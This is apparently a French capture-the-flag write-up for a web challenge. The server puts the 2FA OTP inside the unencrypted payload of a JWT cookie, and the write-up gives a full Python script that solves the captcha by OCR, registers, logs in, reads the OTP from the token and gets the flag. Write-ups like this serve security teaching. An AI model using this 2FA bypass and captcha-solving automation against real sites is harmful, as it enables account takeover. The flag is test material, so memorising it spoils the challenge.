# KnightShop v3 — Web

**URL :** `http://95.216.124.220:31608/`  
**Flag :** `CCOI26{s0MeTiMeS_jwt_lEaKs_T0KeN}`

---

## Ce qui change par rapport à v2

Après le login, au lieu d'atterrir directement sur le dashboard, le serveur redirige vers `/verify_2fa.php` et demande un code OTP à 6 chiffres. Il y a aussi un cookie `knight_token` posé sur le login.

L'indice du challenge : *"The strongest locks are worthless if the key is left in the door."*

---

## Analyse du cookie JWT

Le `knight_token` c'est un JWT. Je le décode à la main (base64 du payload, pas besoin de la signature pour la lecture) :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJr...
.<signature>
```

Le payload décodé :

```json
{
  "user_id": 10,
  "username": "knight43380",
  "email": "knight43380@pwn.io",
  "2fa_token": "435673",
  "iat": 1772014561,
  "exp": 1772014861
}
```

Le champ `2fa_token` est directement dans le JWT que le serveur vient de nous donner. Le serveur signe le token pour qu'on ne puisse pas le modifier, mais il n'a pas chiffré le payload — il est juste encodé en base64. N'importe qui peut lire le contenu d'un JWT sans connaître la clé secrète.

Le serveur nous donne donc la réponse à la question qu'il va poser. Il suffit de la lire.

---

## Exploitation

```python
import base64, json

jwt = s.cookies.get('knight_token')
payload_b64 = jwt.split('.')[1]
payload_b64 += '=' * (-len(payload_b64) % 4)  # fix padding base64
payload = json.loads(base64.b64decode(payload_b64))

otp = payload['2fa_token']  # ex: "435673"
```

Puis on soumet :

```python
r = s.post(f"{BASE}/verify_2fa.php", data={'otp': otp}, allow_redirects=True)
# → dashboard avec le flag
```

---

## Script complet

```python
#!/usr/bin/env python3
import requests, re, io, subprocess, numpy as np, base64, json, random, string
from PIL import Image

BASE = 'http://95.216.124.220:31608'

def ocr_captcha(s):
    r = s.get(f'{BASE}/captcha.php')
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((900, 300), Image.NEAREST)
    big.save('/tmp/cap.png')
    res = subprocess.run(
        ['tesseract', '/tmp/cap.png', 'stdout', '--psm', '7',
         '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
        capture_output=True, text=True)
    return res.stdout.strip()

def decode_jwt(token):
    p = token.split('.')[1]
    p += '=' * (-len(p) % 4)
    return json.loads(base64.b64decode(p))

user  = 'knight' + ''.join(random.choices(string.digits, k=5))
email = user + '@pwn.io'

for _ in range(30):
    s = requests.Session()

    # inscription
    reg = s.get(f'{BASE}/register.php')
    csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', reg.text).group(1)
    cap = ocr_captcha(s)
    r = s.post(f'{BASE}/register.php', data={
        'username': user, 'email': email, 'password': 'Str0ng!Pass',
        'registration_code': 'I_Am_Knight', 'captcha': cap,
        'website': '', 'csrf_token': csrf
    }, allow_redirects=True)
    if 'captcha' in r.text.lower():
        continue

    # login
    lp = s.get(f'{BASE}/login.php')
    lcsrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', lp.text).group(1)
    s.post(f'{BASE}/login.php', data={
        'email': email, 'password': 'Str0ng!Pass',
        'website': '', 'csrf_token': lcsrf
    }, allow_redirects=False)

    # extraire OTP du JWT
    jwt = s.cookies.get('knight_token')
    otp = decode_jwt(jwt)['2fa_token']

    # valider 2FA
    r2 = s.post(f'{BASE}/verify_2fa.php', data={'otp': otp}, allow_redirects=True)
    flags = re.findall(r'CCOI26\{[^}]+\}', r2.text)
    if flags:
        print(f'FLAG: {flags[0]}')
        break
```

Output :
```
FLAG: CCOI26{s0MeTiMeS_jwt_lEaKs_T0KeN}
```

---

Un JWT c'est `header.payload.signature` — le payload est en base64, pas chiffré. Mettre le code 2FA dans le payload du token que tu distribues au client c'est équivalent à écrire la réponse sur la feuille d'examen. La signature empêche de falsifier le token, mais n'empêche pas de lire son contenu.

**Flag : `CCOI26{s0MeTiMeS_jwt_lEaKs_T0KeN}`**
